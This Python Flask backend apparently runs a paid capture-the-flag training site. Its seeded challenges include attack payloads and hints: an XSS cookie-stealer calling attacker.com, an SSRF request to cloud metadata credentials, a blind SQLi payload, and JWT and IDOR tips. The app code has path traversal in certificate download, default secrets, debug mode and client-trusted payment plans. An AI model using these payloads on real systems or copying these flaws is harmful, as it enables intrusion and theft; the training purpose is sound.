"""
BugHunter Lab - AgniProtocol
Backend: Flask + SQLite + Razorpay + JWT Auth
Author: Ganpat N. Darade (AgniProtocol)
"""

from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
from flask_jwt_extended import (
    JWTManager, create_access_token, jwt_required, get_jwt_identity
)
from werkzeug.security import generate_password_hash, check_password_hash
from datetime import datetime, timedelta
import sqlite3, os, razorpay, json
from cert_generator import generate_certificate

app = Flask(__name__)
CORS(app)

# Config
app.config["JWT_SECRET_KEY"] = os.environ.get("JWT_SECRET", "agni-secret-change-in-prod")
app.config["JWT_ACCESS_TOKEN_EXPIRES"] = timedelta(hours=24)
RAZORPAY_KEY_ID     = os.environ.get("RAZORPAY_KEY_ID", "rzp_test_YOUR_KEY")
RAZORPAY_KEY_SECRET = os.environ.get("RAZORPAY_KEY_SECRET", "YOUR_SECRET")

jwt = JWTManager(app)
rzp = razorpay.Client(auth=(RAZORPAY_KEY_ID, RAZORPAY_KEY_SECRET))

DB = "bughunterlab.db"

# ─── DB ───────────────────────────────────────────────────────────────────────

def get_db():
    conn = sqlite3.connect(DB)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as db:
        db.executescript("""
        CREATE TABLE IF NOT EXISTS users (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            username    TEXT UNIQUE NOT NULL,
            email       TEXT UNIQUE NOT NULL,
            password    TEXT NOT NULL,
            plan        TEXT DEFAULT 'free',
            points      INTEGER DEFAULT 0,
            streak      INTEGER DEFAULT 0,
            last_active TEXT,
            created_at  TEXT DEFAULT (datetime('now'))
        );

        CREATE TABLE IF NOT EXISTS challenges (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            name        TEXT NOT NULL,
            category    TEXT NOT NULL,
            difficulty  TEXT NOT NULL,
            points      INTEGER NOT NULL,
            description TEXT,
            terminal    TEXT,
            hint        TEXT,
            flag        TEXT NOT NULL,
            is_free     INTEGER DEFAULT 0,
            is_active   INTEGER DEFAULT 1
        );

        CREATE TABLE IF NOT EXISTS solves (
            id           INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id      INTEGER REFERENCES users(id),
            challenge_id INTEGER REFERENCES challenges(id),
            solved_at    TEXT DEFAULT (datetime('now')),
            UNIQUE(user_id, challenge_id)
        );

        CREATE TABLE IF NOT EXISTS subscriptions (
            id              INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id         INTEGER REFERENCES users(id),
            razorpay_order  TEXT,
            razorpay_payment TEXT,
            plan            TEXT,
            amount          INTEGER,
            status          TEXT DEFAULT 'pending',
            created_at      TEXT DEFAULT (datetime('now'))
        );

        CREATE TABLE IF NOT EXISTS certificates (
            id           INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id      INTEGER REFERENCES users(id),
            challenge_id INTEGER REFERENCES challenges(id),
            cert_path    TEXT,
            issued_at    TEXT DEFAULT (datetime('now'))
        );
        """)
        _seed_challenges(db)

def _seed_challenges(db):
    existing = db.execute("SELECT COUNT(*) as c FROM challenges").fetchone()["c"]
    if existing > 0:
        return
    challenges = [
        ("IDOR Hunter",      "Web/API",   "easy",   100, 1,
         "A target API has /api/v1/profile?user_id=123. Find the flag hidden in another user's profile.",
         '$ curl -H "Authorization: Bearer TOKEN" https://target.lab/api/v1/profile?user_id=1337',
         "Try changing user_id to 1, 2, 3... No auth check = IDOR.",
         "AgniCTF{1D0R_1s_3asy_m0n3y}"),

        ("JWT Bypass",       "Auth",      "medium", 200, 1,
         "JWT token validation has a critical flaw. Find the flag in the admin panel.",
         'eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.sig',
         "What if the server accepts alg:none? Try the none algorithm attack.",
         "AgniCTF{JWT_n0n3_4lg_byp4ss}"),

        ("SSRF Lab",         "Web",       "hard",   350, 0,
         "App fetches external URLs for webhooks. Internal metadata at 169.254.169.254 has the flag.",
         '$ curl -X POST /webhook/test -d \'{"url":"http://169.254.169.254/latest/meta-data/"}\'',
         "AWS metadata endpoint: 169.254.169.254/latest/meta-data/iam/security-credentials/",
         "AgniCTF{SSRF_cl0ud_m3t4d4t4}"),

        ("SQLi Blind",       "Database",  "medium", 250, 0,
         "Login form blocks error-based SQLi but time-based blind injection works.",
         "$ curl /login -d 'user=admin&pass=test' -> {\"msg\":\"Invalid credentials\"}",
         "Try: admin' AND SLEEP(5)-- to confirm blind SQLi.",
         "AgniCTF{bl1nd_sqli_t1m3_15_m0n3y}"),

        ("XSS Stored",       "Web",       "easy",   150, 1,
         "Comment section stores user input without sanitization. Steal admin cookies.",
         "POST /comments -d 'text=Hello World'",
         "Try <script>fetch('https://attacker.com?c='+document.cookie)</script>",
         "AgniCTF{x55_c00k13_st3al3r}"),

        ("Android APK Rev",  "Mobile",    "hard",   400, 0,
         "Reverse engineer the APK to find hardcoded API key. Uses obfuscation.",
         "$ apktool d target.apk && grep -r 'api_key' smali/",
         "Decompile with jadx-gui. Check strings.xml and BuildConfig.",
         "AgniCTF{4pk_h4rdc0d3d_s3cr3t}"),
    ]
    db.executemany(
        "INSERT INTO challenges(name,category,difficulty,points,is_free,description,terminal,hint,flag) VALUES(?,?,?,?,?,?,?,?,?)",
        challenges
    )

# ─── AUTH ─────────────────────────────────────────────────────────────────────

@app.post("/api/auth/register")
def register():
    data = request.json
    username = data.get("username","").strip()
    email    = data.get("email","").strip().lower()
    password = data.get("password","")

    if not all([username, email, password]):
        return jsonify(error="All fields required"), 400
    if len(password) < 6:
        return jsonify(error="Password min 6 chars"), 400

    try:
        with get_db() as db:
            db.execute(
                "INSERT INTO users(username,email,password) VALUES(?,?,?)",
                (username, email, generate_password_hash(password))
            )
        token = create_access_token(identity=email)
        return jsonify(token=token, username=username, plan="free"), 201
    except sqlite3.IntegrityError:
        return jsonify(error="Username or email already exists"), 409

@app.post("/api/auth/login")
def login():
    data  = request.json
    email = data.get("email","").strip().lower()
    pwd   = data.get("password","")

    with get_db() as db:
        user = db.execute("SELECT * FROM users WHERE email=?", (email,)).fetchone()

    if not user or not check_password_hash(user["password"], pwd):
        return jsonify(error="Invalid credentials"), 401

    # Update streak
    with get_db() as db:
        db.execute(
            "UPDATE users SET last_active=datetime('now'), streak=streak+1 WHERE email=?",
            (email,)
        )

    token = create_access_token(identity=email)
    return jsonify(
        token=token,
        username=user["username"],
        plan=user["plan"],
        points=user["points"],
        streak=user["streak"]
    )

@app.get("/api/auth/me")
@jwt_required()
def me():
    email = get_jwt_identity()
    with get_db() as db:
        user = db.execute("SELECT id,username,email,plan,points,streak FROM users WHERE email=?", (email,)).fetchone()
        rank = db.execute(
            "SELECT COUNT(*)+1 as rank FROM users WHERE points > (SELECT points FROM users WHERE email=?)",
            (email,)
        ).fetchone()["rank"]
    if not user:
        return jsonify(error="User not found"), 404
    return jsonify(dict(user) | {"rank": rank})

# ─── CHALLENGES ───────────────────────────────────────────────────────────────

@app.get("/api/challenges")
@jwt_required()
def get_challenges():
    email = get_jwt_identity()
    with get_db() as db:
        user  = db.execute("SELECT id,plan FROM users WHERE email=?", (email,)).fetchone()
        chals = db.execute("SELECT * FROM challenges WHERE is_active=1").fetchall()
        solves = {
            r["challenge_id"]
            for r in db.execute("SELECT challenge_id FROM solves WHERE user_id=?", (user["id"],)).fetchall()
        }

    result = []
    for c in chals:
        d = dict(c)
        d.pop("flag")  # never send flag to client
        if not c["is_free"] and user["plan"] == "free":
            d["locked"] = True
            d.pop("hint", None)
            d.pop("terminal", None)
        d["solved"] = c["id"] in solves
        result.append(d)

    return jsonify(challenges=result)

@app.post("/api/challenges/<int:chal_id>/submit")
@jwt_required()
def submit_flag(chal_id):
    email = get_jwt_identity()
    flag  = (request.json or {}).get("flag","").strip()

    with get_db() as db:
        user  = db.execute("SELECT * FROM users WHERE email=?", (email,)).fetchone()
        chal  = db.execute("SELECT * FROM challenges WHERE id=?", (chal_id,)).fetchone()

        if not chal:
            return jsonify(error="Challenge not found"), 404
        if not chal["is_free"] and user["plan"] == "free":
            return jsonify(error="Upgrade to Pro to unlock this challenge"), 403

        already = db.execute(
            "SELECT id FROM solves WHERE user_id=? AND challenge_id=?",
            (user["id"], chal_id)
        ).fetchone()
        if already:
            return jsonify(error="Already solved!", already_solved=True), 200

        if flag != chal["flag"]:
            return jsonify(correct=False, message="Wrong flag. Keep trying!"), 200

        # Correct!
        db.execute("INSERT INTO solves(user_id,challenge_id) VALUES(?,?)", (user["id"], chal_id))
        db.execute("UPDATE users SET points=points+? WHERE id=?", (chal["points"], user["id"]))

        # Auto-issue certificate for hard+ challenges
        cert_path = None
        if chal["difficulty"] in ("hard", "expert"):
            cert_path = generate_certificate(user["username"], chal["name"], chal["points"])
            db.execute(
                "INSERT INTO certificates(user_id,challenge_id,cert_path) VALUES(?,?,?)",
                (user["id"], chal_id, cert_path)
            )

        new_pts = db.execute("SELECT points FROM users WHERE id=?", (user["id"],)).fetchone()["points"]

    return jsonify(
        correct=True,
        message=f"🎉 Correct! +{chal['points']} points!",
        points_earned=chal["points"],
        total_points=new_pts,
        certificate=cert_path is not None
    )

@app.get("/api/challenges/<int:chal_id>/hint")
@jwt_required()
def get_hint(chal_id):
    email = get_jwt_identity()
    with get_db() as db:
        user = db.execute("SELECT plan FROM users WHERE email=?", (email,)).fetchone()
        if user["plan"] == "free":
            return jsonify(error="Hints require Pro plan"), 403
        chal = db.execute("SELECT hint FROM challenges WHERE id=?", (chal_id,)).fetchone()
    if not chal:
        return jsonify(error="Not found"), 404
    return jsonify(hint=chal["hint"])

# ─── LEADERBOARD ──────────────────────────────────────────────────────────────

@app.get("/api/leaderboard")
def leaderboard():
    with get_db() as db:
        rows = db.execute("""
            SELECT u.username, u.points, u.plan,
                   COUNT(s.id) as solved,
                   ROW_NUMBER() OVER (ORDER BY u.points DESC) as rank
            FROM users u LEFT JOIN solves s ON s.user_id=u.id
            GROUP BY u.id ORDER BY u.points DESC LIMIT 50
        """).fetchall()
    return jsonify(leaderboard=[dict(r) for r in rows])

# ─── PAYMENT (RAZORPAY) ───────────────────────────────────────────────────────

PLANS = {
    "pro":   {"amount": 29900, "label": "Pro Monthly"},   # ₹299 in paise
    "elite": {"amount": 79900, "label": "Elite Monthly"},  # ₹799 in paise
}

@app.post("/api/payment/create-order")
@jwt_required()
def create_order():
    plan = (request.json or {}).get("plan","")
    if plan not in PLANS:
        return jsonify(error="Invalid plan"), 400

    email = get_jwt_identity()
    p = PLANS[plan]

    order = rzp.order.create({
        "amount":   p["amount"],
        "currency": "INR",
        "receipt":  f"bhl_{email}_{plan}_{int(datetime.now().timestamp())}",
        "notes":    {"plan": plan, "email": email}
    })

    with get_db() as db:
        user = db.execute("SELECT id FROM users WHERE email=?", (email,)).fetchone()
        db.execute(
            "INSERT INTO subscriptions(user_id,razorpay_order,plan,amount) VALUES(?,?,?,?)",
            (user["id"], order["id"], plan, p["amount"])
        )

    return jsonify(
        order_id=order["id"],
        amount=p["amount"],
        currency="INR",
        key_id=RAZORPAY_KEY_ID,
        plan=plan,
        label=p["label"]
    )

@app.post("/api/payment/verify")
@jwt_required()
def verify_payment():
    data = request.json or {}
    email = get_jwt_identity()

    try:
        rzp.utility.verify_payment_signature({
            "razorpay_order_id":   data["order_id"],
            "razorpay_payment_id": data["payment_id"],
            "razorpay_signature":  data["signature"]
        })
    except Exception:
        return jsonify(error="Payment verification failed"), 400

    plan = data.get("plan", "pro")
    with get_db() as db:
        db.execute("UPDATE users SET plan=? WHERE email=?", (plan, email))
        db.execute(
            "UPDATE subscriptions SET razorpay_payment=?, status='paid' WHERE razorpay_order=?",
            (data["payment_id"], data["order_id"])
        )

    return jsonify(success=True, plan=plan, message=f"Welcome to {plan.title()} plan!")

# ─── CERTIFICATES ─────────────────────────────────────────────────────────────

@app.get("/api/certificates")
@jwt_required()
def list_certs():
    email = get_jwt_identity()
    with get_db() as db:
        user  = db.execute("SELECT id FROM users WHERE email=?", (email,)).fetchone()
        certs = db.execute("""
            SELECT c.cert_path, c.issued_at, ch.name as challenge, ch.difficulty
            FROM certificates c JOIN challenges ch ON ch.id=c.challenge_id
            WHERE c.user_id=?
        """, (user["id"],)).fetchall()
    return jsonify(certificates=[dict(r) for r in certs])

@app.get("/api/certificates/download/<path:cert_path>")
@jwt_required()
def download_cert(cert_path):
    full = os.path.join("certs", cert_path)
    if not os.path.exists(full):
        return jsonify(error="Certificate not found"), 404
    return send_file(full, as_attachment=True)

# ─── ADMIN ────────────────────────────────────────────────────────────────────

@app.get("/api/admin/stats")
@jwt_required()
def admin_stats():
    email = get_jwt_identity()
    if email != os.environ.get("ADMIN_EMAIL", "ganpat@agniprotocol.com"):
        return jsonify(error="Unauthorized"), 403
    with get_db() as db:
        stats = {
            "total_users":   db.execute("SELECT COUNT(*) as c FROM users").fetchone()["c"],
            "pro_users":     db.execute("SELECT COUNT(*) as c FROM users WHERE plan='pro'").fetchone()["c"],
            "elite_users":   db.execute("SELECT COUNT(*) as c FROM users WHERE plan='elite'").fetchone()["c"],
            "total_solves":  db.execute("SELECT COUNT(*) as c FROM solves").fetchone()["c"],
            "total_revenue": db.execute("SELECT COALESCE(SUM(amount),0) as s FROM subscriptions WHERE status='paid'").fetchone()["s"],
        }
        stats["mrr"] = stats["pro_users"]*299 + stats["elite_users"]*799
    return jsonify(stats)

if __name__ == "__main__":
    init_db()
    app.run(debug=True, port=5000)
